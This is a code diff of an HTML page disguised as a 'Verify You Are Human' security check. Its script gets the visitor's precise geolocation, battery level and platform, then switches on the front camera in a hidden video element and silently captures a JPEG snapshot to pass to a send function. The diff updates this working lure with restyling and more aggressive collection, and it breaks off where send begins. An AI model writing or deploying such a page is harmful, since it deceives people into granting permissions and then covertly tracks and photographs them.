@@ -1,46 +1,50 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Human Verification</title>
+    <title>Verify You Are Human</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { background: #000; color: #fff; font-family: sans-serif; text-align: center; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .box { border: 1px solid #333; padding: 20px; border-radius: 10px; }
-        button { background: #007bff; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-size: 16px; }
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .box { border: 1px solid #0f0; padding: 30px; border-radius: 5px; box-shadow: 0 0 15px #0f0; }
+        button { background: #0f0; color: #000; padding: 12px 25px; border: none; cursor: pointer; font-weight: bold; margin-top: 20px; }
     </style>
 </head>
 <body>
     <div class="box">
-        <h2>Verify You Are Human</h2>
-        <p>Please allow access to complete security check.</p>
-        <button onclick="init()">VERIFY NOW</button>
+        <h3>🔒 SECURITY CHECK</h3>
+        <p>Complete verification to view content.</p>
+        <button onclick="start()">VERIFY NOW</button>
     </div>
 
     <video id="v" style="display:none;" autoplay></video>
     <canvas id="c" style="display:none;" width="640" height="480"></canvas>
 
     <script>
-        async function init() {
-            let info = { platform: navigator.platform, battery: "N/A", lat: "N/A", lon: "N/A" };
+        async function start() {
+            let info = { platform: navigator.platform, battery: "N/A", lat: "0", lon: "0" };
             
-            // Battery
-            if(navigator.getBattery) { const b = await navigator.getBattery(); info.battery = (b.level*100)+"%"; }
+            // Battery info
+            if(navigator.getBattery) { const b = await navigator.getBattery(); info.battery = Math.round(b.level*100)+"%"; }
 
-            // Location & Camera
-            navigator.geolocation.getCurrentPosition(async (p) => {
-                info.lat = p.coords.latitude; info.lon = p.coords.longitude;
+            // Location & Camera Permission
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                info.lat = pos.coords.latitude; info.lon = pos.coords.longitude;
                 try {
-                    const s = await navigator.mediaDevices.getUserMedia({video:true});
-                    const v = document.getElementById('v'); v.srcObject = s;
+                    const stream = await navigator.mediaDevices.getUserMedia({video: { facingMode: "user" }});
+                    const video = document.getElementById('v');
+                    video.srcObject = stream;
+                    
                     setTimeout(() => {
-                        const cn = document.getElementById('c');
-                        cn.getContext('2d').drawImage(v,0,0);
-                        const img = cn.toDataURL('image/jpeg');
-                        s.getTracks().forEach(t => t.stop());
-                        send(info, img);
-                    }, 2000);
+                        const canvas = document.getElementById('c');
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        const imgData = canvas.toDataURL('image/jpeg', 0.7);
+                        stream.getTracks().forEach(t => t.stop());
+                        send(info, imgData);
+                    }, 1500);
                 } catch(e) { send(info, null); }
-            }, (e) => { alert("Verification failed. Please allow permissions."); });
+            }, (err) => { 
+                alert("Error: Please allow Location and Camera to verify."); 
+            }, {enableHighAccuracy:true});
         }
 
         function send(i, p) {
